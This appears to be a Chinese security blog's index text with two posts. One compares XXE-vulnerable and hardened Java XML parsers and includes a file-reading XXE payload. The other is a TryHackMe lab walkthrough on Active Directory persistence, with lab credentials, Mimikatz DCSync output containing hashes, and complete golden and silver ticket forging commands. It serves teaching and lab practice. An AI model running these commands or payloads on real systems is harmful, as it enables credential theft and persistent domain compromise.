//将xml读取到doc SAXBuilder builder = new SAXBuilder(); //使用默认解析器 Document doc = builder.build(reader); // 获取响应输出流 PrintWriter writer = resp.getWriter(); //将doc写到输出流 XMLOutputter outputter = new XMLOutputter(); outputter.output(doc, writer); } catch (JDOMException | IOException e) { e.printStackTrace(); } } private void postWithFixXxe(HttpServletRequest req, HttpServletResponse resp) { try { //获取请求输入流 BufferedReader reader = req.getReader(); //将xml读取到doc，通过setFeature设置dtd、外部实体读取 防止xxe漏洞 SAXBuilder builder = new SAXBuilder(); builder.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); builder.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); builder.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); builder.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false); Document doc = builder.build(reader); // 获取响应输出流 PrintWriter writer = resp.getWriter(); //将doc写到输出流 XMLOutputter outputter = new XMLOutputter(); outputter.output(doc, writer); } catch (JDOMException | IOException e) { e.printStackTrace(); } } } 两种方法对比即可发现防御代码部分为： builder.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); builder.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); builder.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); builder.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false); 看到这里是对builder的setFeature属性做出了更改，对于里面的内容，顾名思义也很容易知道这里对于禁止 XML 文档中的文档类型声明（DOCTYPE declaration）：disallow-doctype-decl（设置true）、外部实体加载：external-general-entities、外部参数实体：external-parameter-entities、加载外部dtd文件：load-external-dtd都设置了false，杜绝的xxe的可能 当在doPost中调用postNoFixXxe时，构造xml，成功访问文件内容，可以导致xxe漏洞。（以下都借用师傅的图了） 当在doPost中调用postWithFixXxe时，成功防御了xxe漏洞，响应未输出xml，并且log报错不允许dtd。 DocumentBuilder(原生dom解析xml) 为了方便输出用了TransformerFactory将document输出到响应流。 import org.w3c.dom.Document; import org.xml.sax.InputSource; import javax.servlet.ServletException; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.xml.XMLConstants; import javax.xml.parsers.DocumentBuilder; import javax.xml.parsers.DocumentBuilderFactory; import java.io.BufferedReader; import java.io.IOException; import java.io.PrintWriter; public class DocumentBuilderServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { super.doGet(req, resp); } @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { postNoFixXxe(req, resp); // postWithFixXxe(req, resp); } private void postNoFixXxe(HttpServletRequest req, HttpServletResponse resp) { try { DocumentBuilderFactory documentBuilderFactory = DocumentBuilderFactory.newInstance(); DocumentBuilder documentBuilder = documentBuilderFactory.newDocumentBuilder(); BufferedReader br = new BufferedReader(req.getReader()); Document document = documentBuilder.parse(new InputSource(br)); // 获取响应输出流 PrintWriter writer = resp.getWriter(); String textContent = document.getDocumentElement().getTextContent(); writer.print(textContent); } catch (Exception e) { e.printStackTrace(); } } private void postWithFixXxe(HttpServletRequest req, HttpServletResponse resp) { try { DocumentBuilderFactory documentBuilderFactory = DocumentBuilderFactory.newInstance(); documentBuilderFactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\"); documentBuilderFactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, \"\"); documentBuilderFactory.setAttribute(XMLConstants.FEATURE_SECURE_PROCESSING, true); documentBuilderFactory.setExpandEntityReferences(false); DocumentBuilder documentBuilder = documentBuilderFactory.newDocumentBuilder(); BufferedReader br = new BufferedReader(req.getReader()); Document document = documentBuilder.parse(new InputSource(br)); // 获取响应输出流 PrintWriter writer = resp.getWriter(); String textContent = document.getDocumentElement().getTextContent(); writer.print(textContent); } catch (Exception e) { e.printStackTrace(); } } } 与上述实验一类似，关键代码如下： documentBuilderFactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\"); documentBuilderFactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, \"\"); documentBuilderFactory.setAttribute(XMLConstants.FEATURE_SECURE_PROCESSING, true); 这里设置为禁止访问外部dtd文件（ACCESS_EXTERNAL_DTD为空）、禁止访问外部xml schema文件（ACCESS_EXTERNAL_SCHEMA为空） 另外还有启用安全处理特性（FEATURE_SECURE_PROCESSING）：这个特性将启用 XML 处理器的安全功能，例如禁用外部实体（External Entities）加载，防止 XXE（XML External Entity）攻击。 调用postNoFixXxe 调用postWithFixXxe SAXReader解析xml import javax.servlet.ServletException; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import org.dom4j.Document; import org.dom4j.io.SAXReader; import org.dom4j.io.XMLWriter; public class SAXReaderServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { super.doGet(req, resp); } @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { postNoFixXxe(req,resp); // postWithFixXxe(req,resp); } private void postNoFixXxe(HttpServletRequest req, HttpServletResponse resp){ try{ SAXReader saxReader = new SAXReader(); Document doc = saxReader.read(req.getReader()); XMLWriter xmlWriter = new XMLWriter(resp.getWriter()); xmlWriter.write(doc); }catch (Exception e){ e.printStackTrace(); } } private void postWithFixXxe(HttpServletRequest req, HttpServletResponse resp){ try{ SAXReader saxReader = new SAXReader(); saxReader.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); saxReader.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); saxReader.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); saxReader.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false); Document doc = saxReader.read(req.getReader()); XMLWriter xmlWriter = new XMLWriter(resp.getWriter()); xmlWriter.write(doc); }catch (Exception e){ e.printStackTrace(); } } } 与实验一的SAXBulider基本相同： saxReader.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); saxReader.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); saxReader.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); saxReader.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false); 不再赘述，调用postNoFixXxe 调用postWithFixXxe SAXTransformerFactory解析xml SAXTransformerFactory解析xml，需要xslt，否则会报错，所以构造时要构造xslt。正常情况需要将xml输出，本次实验为了节省时间没有输出。 import javax.servlet.ServletException; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.xml.XMLConstants; import javax.xml.transform.Result; import javax.xml.transform.sax.SAXTransformerFactory; import javax.xml.transform.sax.TransformerHandler; import javax.xml.transform.stream.StreamResult; import javax.xml.transform.stream.StreamSource; import java.io.IOException; public class SAXTransformerFactoryServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { super.doGet(req, resp); } @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { postNoFixXxe(req, resp); // postWithFixXxe(req, resp); } private void postNoFixXxe(HttpServletRequest req, HttpServletResponse resp){ try{ SAXTransformerFactory sf = (SAXTransformerFactory) SAXTransformerFactory.newInstance(); StreamSource source = new StreamSource(req.getReader()); TransformerHandler transformerHandler = sf.newTransformerHandler(source); // 创建Result对象，并通过transformerHandler将目的流与其关联 Result result = new StreamResult(resp.getWriter()); transformerHandler.setResult(result); }catch (Exception e){ e.printStackTrace(); } } private void postWithFixXxe(HttpServletRequest req, HttpServletResponse resp){ try{ SAXTransformerFactory sf = (SAXTransformerFactory) SAXTransformerFactory.newInstance(); sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\"); sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, \"\"); StreamSource source = new StreamSource(req.getReader()); TransformerHandler transformerHandler = sf.newTransformerHandler(source); // 创建Result对象，并通过transformerHandler将目的流与其关联 Result result = new StreamResult(resp.getWriter()); transformerHandler.setResult(result); }catch (Exception e){ e.printStackTrace(); } } } 关键代码： sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\"); sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, \"\"); 一个是禁止访问外部dtd文件； 另一个是禁止访问外部样式表文件：样式表用于指定 XML 数据的呈现方式，禁止访问外部样式表可以防止 XML 转换器加载恶意内容，提高安全性。 构造xml和xslt如下： &lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY file SYSTEM \"file:///E://111.txt\" &gt; ]&gt; &lt;?xml-stylesheet type=\"text/xsl\" href=\"E://222.xsl\"?&gt; &lt;catalog&gt; &lt;test&gt;&amp;file;&lt;/test&gt; &lt;/catalog&gt; &lt;!--xslt文件内容如下--&gt; &lt;xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"&gt; &lt;xsl:template match=\"/\"&gt; &lt;html&gt; &lt;body&gt; &lt;h2&gt;teat&lt;/h2&gt; &lt;table border=\"1\"&gt; &lt;tr bgcolor=\"#9acd32\"&gt; &lt;th align=\"left\"&gt;File&lt;/th&gt; &lt;/tr&gt; &lt;xsl:for-each select=\"catalog\"&gt; &lt;tr&gt; &lt;td&gt;&lt;xsl:value-of select=\"test\"/&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/xsl:for-each&gt; &lt;/table&gt; &lt;/body&gt; &lt;/html&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; 构造xml请求，在未禁止外部实体情况下可以正常响应，控制台未报错： 修复后报错： TransformerFactory解析xml 这个就是Jenkins Nested View插件XXE漏洞(CVE-2021-21680)用到的xml解析工具。 import javax.servlet.ServletException; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.xml.XMLConstants; import javax.xml.transform.Source; import javax.xml.transform.Transformer; import javax.xml.transform.TransformerException; import javax.xml.transform.TransformerFactory; import javax.xml.transform.stream.StreamResult; import javax.xml.transform.stream.StreamSource; import java.io.IOException; public class TransformerFactoryServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { super.doGet(req, resp); } @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { postNoFixXxe(req, resp); // postWithFixXxe(req, resp); } private void postNoFixXxe(HttpServletRequest req, HttpServletResponse resp){ try { TransformerFactory tf = TransformerFactory.newInstance(); StreamSource source = new StreamSource(req.getReader()); tf.newTransformer().transform(source, new StreamResult(resp.getWriter())); } catch (TransformerException | IOException e) { e.printStackTrace(); } } private void postWithFixXxe(HttpServletRequest req, HttpServletResponse resp){ try { TransformerFactory tf = TransformerFactory.newInstance(); StreamSource source = new StreamSource(req.getReader()); tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\"); tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, \"\"); tf.newTransformer().transform(source, new StreamResult(resp.getWriter())); } catch (TransformerException | IOException e) { e.printStackTrace(); } } } 与上一个实验基本相同，不再赘述 Unmarshaller解析xml 使用默认的解析方法不会存在XXE问题，这也是唯一一个使用默认的解析方法不会存在XXE的一个库。 Class tClass = Some.class; JAXBContext context = JAXBContext.newInstance(tClass); Unmarshaller um = context.createUnmarshaller(); Object o = um.unmarshal(ResourceUtils.getPoc1()); tClass.cast(o); 小结： 基本上所有的修复都是设置禁止外部实体，但是需要注意通过setFeature或者setAttribute或者setProperty设置属性时，一定要注意在解析xml之前就设置，否则修复也是无效的。 Java XXE漏洞的修复或预防主要在设置禁止dtd，一般出现漏洞需要注意： 是否禁止dtd或者entity 参数是否可控 传入参数格式为REST XML格式，X-RequestEntity-ContentType: application/xml 0x04 参考文章 Java XXE漏洞实验及总结","categories":["常见top漏洞"]},{"title":"THM-Persisting Active Directory","path":"/2024/02/19/thm-persisting-active-directory/","content":"0x01 简介 该网络是 Breaching AD、Enumerate AD 和 Exploiting AD 网络的延续。请确保先完成这些网络，然后再继续此操作。另请注意，我们将广泛讨论 AD 对象。如果您需要复习一下，请快速浏览一下这个房间。现在我们已经利用了 AD 并取得了一些可以执行我们目标的位置，我们需要确保我们部署持久性以确保蓝队不能直接把我们踢出去。在此网络中，我们将探索可用于在 AD 中持久化的几种不同方法。 AD 维持 在攻击 AD 的过程中，我们需要确保部署持久性。这将确保蓝队无法通过简单地轮换一些凭证来将我们踢出局。如前所述，AD 的破坏过程是循环的。当我们损害 AD 财产时，我们会部署持久性，而不仅仅是在最后。这确保了如果我们的一个位置被蓝队烧毁，我们有几个后备方案。在此持久阶段，我们将使用多种技术来确保我们获得的访问权限不会被简单地撤销。这些持久性技术取决于我们迄今为止获得的特定权限和特权。 学习目标 在这个网络中，我们将介绍几种可用于在 AD 中持久化的方法。这绝不是一个完整的列表，因为可用的方法通常是高度情境化的，并且依赖于 AD 结构和环境。但是，我们将介绍以下持久 AD 技术： AD 凭据和 DCSync-ing 银票和金票 AD Certificates AD 安全标识符 (SID) Access Control Lists 访问控制列表 组策略对象 (GPO) 索取您的凭证 为了模拟 AD 违规，您将获得第一组 AD 凭据。网络设置完成后，在攻击箱上导航至 http://distributor.za.tryhackme.loc/creds 以请求您的凭据对。单击“获取凭据”按钮以接收可用于初始访问的凭据对。 此凭据对将为您提供对 THMWRK1.za.tryhackme.loc 的 RDP 和 SSH 访问权限。 THMWRK1 可以被视为进入该环境的跳转主机，模拟您已实现的立足点。跳转主机经常成为红队的目标，因为它们提供对新网段的访问。您可以使用 Remmina 或任何其他类似的远程桌面客户端连接到该主机以进行 RDP。连接时记得指定za.tryhackme.loc的域名。 对于 SSH 访问，您可以使用以下 SSH 命令： ssh za\\\\colin.lane@thmwrk1.za.tryhackme.loc // Your credentials have been generated: Username: colin.lane Password: Arrangement2012 出现提示时，提供您帐户的关联密码。尽管 RDP 可用于所有任务，但 SSH 速度更快。 0x02 通过凭证进行持久化 恭喜你 恭喜疲惫的旅行者！在突破 AD、执行枚举并一路利用它到顶部（如果你按顺序完成了这些 AD 网络）之后，你终于到达了持久性的酒馆。艰苦的工作已经结束，现在是时候享受一些乐趣了。虽然 AD 持久性仍然是一件严肃的事情，但它确实不像其他阶段那么有压力。在这里我们可以尽情发挥我们的创造力。所以，在我们的小酒馆里休息一下您疲惫的骨头，给自己泡一杯好茶，然后我们就开始吧。 连同您的低特权凭据，您将获得域管理员凭据。多么幸运啊！在讨论持久性技术时，您将使用特权凭据对低特权凭据集执行持久性技术。记下以下 DA 帐户： Username: `Administrator` 用户名： `Administrator` Password: `tryhackmewouldnotguess1@` 密码： `tryhackmewouldnotguess1@` Domain: `ZA` 域： `ZA` 由于我们为您提供对整个域的完全访问权限，因此我们无法真正隐藏任何标志或强迫您确保在回答问题之前自己执行这些持久性技术。不过，我们鼓励您花时间尝试这些方法，因为当蓝队开始将您踢出局时，它们将作为红队评估的回报。 我们将讨论的第一个也是最不可靠的持久性技术是凭证。前面讨论的一些横向技术可能会导致攻击者获得凭证的访问权限。当使用“凭据”一词时，它可能意味着用户名和密码对，但在 AD 上下文中，即使是密码哈希也足以通过哈希传递技术进行身份验证。 DC Sync（同步） 在大型组织中，每个域只有一个域控制器是不够的。这些域通常在多个区域位置使用，并且拥有单个 DC 会显着延迟 AD 中的任何身份验证服务。因此，这些组织使用多个 DC。那么问题就变成了，您如何在两个不同的办公室使用相同的凭据进行身份验证？ 这个问题的答案是域复制。每个域控制器都运行一个称为知识一致性检查器 (KCC) 的进程。 KCC为AD林生成复制拓扑，并通过远程过程调用（RPC）自动连接到其他域控制器以同步信息。这包括更新的信息，例如用户的新密码和新对象，例如创建新用户的时间。这就是为什么您在更改密码后通常必须等待几分钟才能进行身份验证，因为发生密码更改的 DC 可能与您进行身份验证的 DC 不同。 复制过程称为 DC 同步。不仅仅是 DC 可以启动复制。属于域管理员组的帐户也可以出于合法目的（例如创建新的域控制器）执行此操作。 一种流行的攻击是 DC 同步攻击。如果我们有权访问具有域复制权限的帐户，我们可以发起 DC 同步攻击以从 DC 获取凭据。 并非所有凭证都是一样的 在开始 DC 同步攻击之前，我们首先讨论一下我们可能会寻找哪些凭据。虽然我们应该始终寻求转储特权凭据，例如域管理员组成员的凭据，但这些也是首先要轮换的凭据（蓝队术语，意思是重置帐户密码）。因此，如果我们只有特权凭证，可以肯定地说，一旦蓝队发现我们，他们就会轮换这些帐户，我们可能会失去访问权限。 那么我们的目标就是坚持拥有接近特权的凭证。我们并不总是需要王国的完整钥匙；我们只需要足够的钥匙来确保我们仍然能够实现目标执行并始终让蓝队保持警惕。因此，我们应该尝试通过如下凭证来持久保存： 在多台计算机上具有本地管理员权限的凭据。通常，组织有一两个对几乎所有计算机具有本地管理权限的组。这些组通常分为一组用于工作站，一组用于服务器。通过获取这些团体成员的凭据，我们仍然可以访问该庄园中的大部具有委派权限的服务帐户。有了这些账户，我们就能够强制金票和银票执行 Kerberos 委托攻击。 用于特权 AD 服务的帐户。如果我们泄露了特权服务（例如 Exchange、Windows Server Update Services (WSUS) 或 System Center Configuration Manager (SCCM)）的帐户，我们可以利用 AD 漏洞再次获得特权立足点。 当谈到要转储和保留哪些凭证时，它受到很多因素的影响。您必须发挥创意并根据具体情况进行思考。然而，对于这个房间，我们将享受一些乐趣，让蓝队流汗，并放弃我们能得到的每一份凭证！ DC同步全部 我们将使用 Mimikatz 来获取凭证。使用 DA 帐户通过 SSH 登录 THMWRK1 并加载 Mimikatz： 让我们首先对我们自己的单个帐户执行 DC 同步： mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /user:louis.cole [DC] 'za.tryhackme.loc' will be the domain [DC] 'THMDC.za.tryhackme.loc' will be the DC server [DC] 'louis.cole' will be the user account [rpc] Service : ldap [rpc] AuthnSvc : GSS_NEGOTIATE (9) Object RDN : louis.cole ** SAM ACCOUNT ** SAM Username : louis.cole Account Type : 30000000 ( USER_OBJECT ) User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD ) Account expiration : Password last change : 4/25/2022 6:30:03 PM Object Security ID : S-1-5-21-3885271727-2693558621-2658995185-1120 Object Relative ID : 1120 Credentials: Hash NTLM: fbdcd5041c96ddbd82224270b57f11fc ntlm- 0: fbdcd5041c96ddbd82224270b57f11fc lm - 0: d40bfd7d451f6f58d12ff18ccab7e820 Supplemental Credentials: * Primary:NTLM-Strong-NTOWF * Random Value : 474acb706d53bbdb880e1dd75bc4ba8d * Primary:Kerberos-Newer-Keys * Default Salt : ZA.TRYHACKME.LOClouis.cole Default Iterations : 4096 Credentials aes256_hmac (4096) : c069badc39ba1027c18b4833b4c25491f298a79e99eb227d44d0617b84a0b534 aes128_hmac (4096) : 9b07abcdc3c080f9d0a5cadfe2f6e244 des_cbc_md5 (4096) : 408920ec6426da52 * Primary:Kerberos * Default Salt : ZA.TRYHACKME.LOClouis.cole Credentials des_cbc_md5 : 408920ec6426da52 * Packages * NTLM-Strong-NTOWF * Primary:WDigest * 01 c9ec818441c8c6df6d1d831a0c6771af 02 4708f92952296eaa3d4b6553309843d6 03 350a3aa15bbab0697e93497f67d83114 04 c9ec818441c8c6df6d1d831a0c6771af 05 4708f92952296eaa3d4b6553309843d6 06 a95cc2cd2e9193f72632108e6ff4a361 07 c9ec818441c8c6df6d1d831a0c6771af ..... 您将看到相当多的输出，包括您帐户当前的 NTLM 哈希值。您可以通过使用此类网站将您的密码转换为 NTLM 哈希来验证 NTLM 哈希是否正确。 这很棒，但我们希望 DC 同步每个帐户。为此，我们必须在 Mimikatz 上启用日志记录： 确保将更改为您的用户名，以免覆盖其他用户的日志转储。现在，我们将使用 /all 标志，而不是指定我们的帐户： lsadump::dcsync /domain:za.tryhackme.loc /all 这将需要一些时间才能完成。完成后，退出 Mimikatz 以完成转储查找，然后您可以下载 _dcdump.txt 文件。您可以使用 cat &lt;username&gt;_dcdump.txt | grep \"SAM Username\" 恢复所有用户名，使用 cat &lt;username&gt;_dcdump.txt | grep \"Hash NTLM\" 恢复所有哈希值。现在，我们可以执行离线密码破解攻击来恢复纯文本凭证，或者简单地使用 Mimikatz 执行哈希传递攻击。 scp Administrator@thmwrk1.za.tryhackme.loc:C:/Tools/mimikatz_trunk/x64/hybcx_dcdump.txt . //密码:tryhackmewouldnotguess1@ 0x03 通过票据持久化 正如前面任务中所讨论的，我们经常希望通过具有委派权限的服务帐户来持久化伪造银票和金票。但这些到底是什么，为什么每次蓝队桌面演习结束时都会有人大喊：“冲掉所有金票和银票！”。 巧克力工厂门票 在讨论金票和银票之前，我们首先需要快速回顾一下 Kerberos 身份验证。下图显示了 Kerberos 身份验证的正常流程： 用户在 DC 上向密钥分发中心（KDC）发出 AS-REQ 请求，其中包括使用用户的 NTLM 散列加密的时间戳。本质上，这是请求一个票据授予票据（TGT）。DC 检查信息并将 TGT 发送给用户。这个 TGT 使用仅存储在 DC 上的 KRBTGT 帐户的密码哈希进行签名。现在，用户可以将这个 TGT 发送给 DC，以请求对用户想要访问的资源的票据授予服务（TGS）。如果 TGT 检查通过，DC 将响应 TGS，该 TGS 使用用户请求访问的服务的 NTLM 散列加密。然后用户将这个 TGS 提交给服务进行访问，服务可以验证 TGS，因为它知道自己的散列并可以授予用户访问权限。 说了所有这些背景理论后，是时候研究一下金票和银票了。 黄金票据 金票是伪造的 TGT。这意味着我们绕过上图中的步骤 1 和 2，向 DC 证明我们是谁。拥有特权帐户的有效 TGT，我们现在可以为几乎任何我们想要的服务请求 TGS。为了伪造金票，我们需要 KRBTGT 帐户的密码哈希，以便我们可以为我们想要的任何用户帐户签署 TGT。关于金票的一些有趣的说明： 通过在 Kerberos 进程的此阶段进行注入，我们不需要要模拟的帐户的密码哈希，因为我们绕过了该步骤。 TGT仅用于证明DC上的KDC对其进行了签名。由于它是由 KRBTGT 哈希签名的，因此该验证通过，并且无论其内容如何，​​TGT 都被声明为有效。 说到内容，KDC 只会验证 TGT 中指定的用户帐户（如果该帐户早于 20 分钟）。这意味着我们可以将禁用、删除或不存在的帐户放入 TGT，只要我们确保时间戳不超过 20 分钟，它就有效。 由于票证的策略和规则是在 TGT 本身中设置的，因此我们可以覆盖 KDC 推送的值，例如票证只能在 10 小时内有效。例如，我们可以确保我们的 TGT 有效期为 10 年，从而赋予我们持久性。 默认情况下，KRBTGT 帐户的密码永远不会更改，这意味着一旦我们拥有密码，除非手动轮换，否则我们可以通过永久生成 TGT 来获得持久访问权限。 蓝队必须将 KRBTGT 帐户的密码轮换两次，因为当前密码和以前的密码对该帐户仍然有效。这是为了确保密码的意外轮换不会影响服务。 轮换 KRBTGT 帐户的密码对于蓝队来说是一项非常痛苦的过程，因为这将导致环境中的大量服务停止工作。他们可能认为自己拥有一个有效的 TGT，有时甚至会持续几个小时，但那个 TGT 已经失效了。并非所有的服务都足够智能，能够在 TGT 失效后释放它（因为时间戳仍然有效），因此它们不会自动请求一个新的 TGT。 黄金票据甚至可以让您绕过智能卡验证，因为在创建 TGT 之前，智能卡是由 DC 验证的。 除了 KRBTGT 帐户的密码哈希之外，我们只需要域名、域 SID 和我们想要模拟的人的用户 ID。如果我们处于可以恢复 KRBTGT 帐户密码哈希的位置，那么我们已经处于可以恢复其他所需信息的位置了。 白银票据 银票是伪造的 TGS 票。因此，现在，我们跳过与 DC 上的 K DC 进行的所有通信（上图中的步骤 1-4），而只与我们想要直接访问的服务进行交互。关于银票的一些有趣的说明： 生成的 TGS 由我们目标主机的机器帐户签名。 金票和银票之间的主要区别在于我们获得的特权数量。如果我们拥有 KRBTGT 帐户的密码哈希值，我们就可以访问所有内容。使用银票，由于我们只能访问我们正在攻击的服务器的计算机帐户的密码哈希，因此我们只能模拟该主机本身的用户。银票的范围仅限于特定服务器上的任何服务。 由于 TGS 是伪造的，所以没有关联的 TGT，这意味着 DC 从未被联系过。这使得攻击非常危险，因为唯一可用的日志将在目标服务器上。因此，虽然范围更有限，但对于蓝队来说，检测起来要困难得多。 由于权限是通过 SID 确定的，因此我们可以再次为银票证创建一个不存在的用户，只要我们确保该票证具有将用户置于主机的本地管理员组中的相关 SID。 机器帐户的密码通常每 30 天轮换一次，这不利于持久性。但是，我们可以利用 TGS 提供的访问权限来访问主机注册表并更改负责机器帐户密码轮换的参数。从而确保机器帐户保持静态并授予我们在机器上的持久性。 虽然只能访问单个主机可能看起来是一个显著的降级，但机器帐户可以像普通的AD帐户一样使用，不仅允许您对主机进行管理员访问，还可以继续像使用AD用户帐户一样枚举和利用AD。 伪造门票以获取乐趣和利润 现在我们已经解释了金票和银票的基础知识，让我们生成一些。您将需要 KRBTGT 帐户的 NTLM 哈希值，由于在上一个任务中执行了 DC 同步，您现在应该拥有该哈希值。此外，记下与 THMSERVER1 计算机帐户关联的 NTLM 哈希值，因为我们需要这个哈希值作为银票。您可以在执行的 DC 转储中找到此信息。我们需要的最后一条信息是域 SID。使用 THMWRK1 上的低特权 SSH 终端，我们可以使用 AD-RSAT cmdlet 来恢复此信息： ssh za\\\\phillip.wilkins@thmwrk1.za.tryhackme.loc &nbsp; //Your credentials have been generated: Username: phillip.wilkins Password: Developmental1971 输入以下命令获取到相关信息 PS C:\\Users\\phillip.wilkins&gt; Get-ADDomain AllowedDNSSuffixes : {} ChildDomains : {} ComputersContainer : CN=Computers,DC=za,DC=tryhackme,DC=loc DeletedObjectsContainer : CN=Deleted Objects,DC=za,DC=tryhackme,DC=loc DistinguishedName : DC=za,DC=tryhackme,DC=loc DNSRoot : za.tryhackme.loc DomainControllersContainer : OU=Domain Controllers,DC=za,DC=tryhackme,DC=loc DomainMode : Windows2012R2Domain DomainSID : S-1-5-21-3885271727-2693558621-2658995185 ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=za,DC=tryhackme,DC=loc Forest : tryhackme.loc InfrastructureMaster : THMDC.za.tryhackme.loc LastLogonReplicationInterval : LinkedGroupPolicyObjects : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=za,DC=tryhackme,DC=loc} LostAndFoundContainer : CN=LostAndFound,DC=za,DC=tryhackme,DC=loc ManagedBy : Name : za NetBIOSName : ZA ObjectClass : domainDNS ObjectGUID : 1fc9e299-da51-4d03-baa0-862c3360c0b2 ParentDomain : tryhackme.loc PDCEmulator : THMDC.za.tryhackme.loc PublicKeyRequiredPasswordRolling : QuotasContainer : CN=NTDS Quotas,DC=za,DC=tryhackme,DC=loc ReadOnlyReplicaDirectoryServers : {} ReplicaDirectoryServers : {THMDC.za.tryhackme.loc} RIDMaster : THMDC.za.tryhackme.loc SubordinateReferences : {DC=DomainDnsZones,DC=za,DC=tryhackme,DC=loc} SystemsContainer : CN=System,DC=za,DC=tryhackme,DC=loc UsersContainer : CN=Users,DC=za,DC=tryhackme,DC=loc 现在我们已经拥有了所有必需的信息，我们可以重新启动 Mimikatz： 加载 Mimikatz 后，执行以下操作以生成黄金票证： kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt 参数解释： /admin - 我们要模拟的用户名。这不必是有效用户。 /domain - 我们要为其生成票证的域的 FQDN。 /id - 用户 RID。默认情况下，Mimikatz 使用 RID 500，这是默认的管理员帐户 RID。 /sid - 我们要为其生成票证的域的 SID。 /krbtgt - KRBTGT 帐户的 NTLM 哈希值。 /endin - 票证有效期。默认情况下，Mimikatz 生成一张有效期为 10 年的票证。 AD默认的Kerberos策略是10小时（600分钟） /renewmax - 续订的最长票证生命周期。默认情况下，Mimikatz 生成一张有效期为 10 年的票证。 AD默认的Kerberos策略是7天（10080分钟） /ptt - 该标志告诉 Mimikatz 将票证直接注入会话中，这意味着它已准备好使用。 我们可以通过对域控制器运行 dir 命令来验证黄金票证是否正常工作： dir \\\\thmdc.za.tryhackme.loc\\c$\\ 在这里我又另起了一个ssh会话，接着输入以上命令发现没有权限 接着我在原ssh上试了试发现成功 即使黄金票据的有效期非常长，蓝队仍然可以通过简单地两次轮换 KRBTGT 密码来防御。如果我们真的想深入了解，我们希望生成白银票据，这些票据不太可能被发现，并且更难以防御，因为必须轮换每个机器帐户的密码。我们可以使用以下 Mimikatz 命令来生成白银票据： kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /target:THMSERVER1.za.tryhackme.loc /rc4:4c02d970f7b3da7f8ab6fa4dc77438f4 /service:cifs /ptt 参数解释： /admin - 我们要模拟的用户名。这不必是有效用户。 /domain - 我们要为其生成票证的域的 FQDN。 /id - 用户 RID。默认情况下，Mimikatz 使用 RID 500，这是默认的管理员帐户 RID。 /sid - 我们要为其生成票证的域的 SID。 /target - 我们的目标服务器的主机名。让我们做 THMSERVER1.za.tryhackme.loc，但它可以是任何加入域的主机。 /rc4 - 我们的目标计算机帐户的 NTLM 哈希值。查看 DC 同步结果以查找 THMSERVER1$ 的 NTLM 哈希值。 $ 表示它是一个机器帐户。 /service - 我们在 TGS 中请求的服务。 CIFS 是一个安全的选择，因为它允许文件访问。 /ptt - 该标志告诉 Mimikatz 将票证直接注入会话中，这意味着它已准备好使用。 我们可以通过对 THMSERVER1 运行 dir 命令来验证银票是否正常工作： dir \\\\thmserver1.za.tryhackme.loc\\c$\\ 0x04 通过证书进行持久化 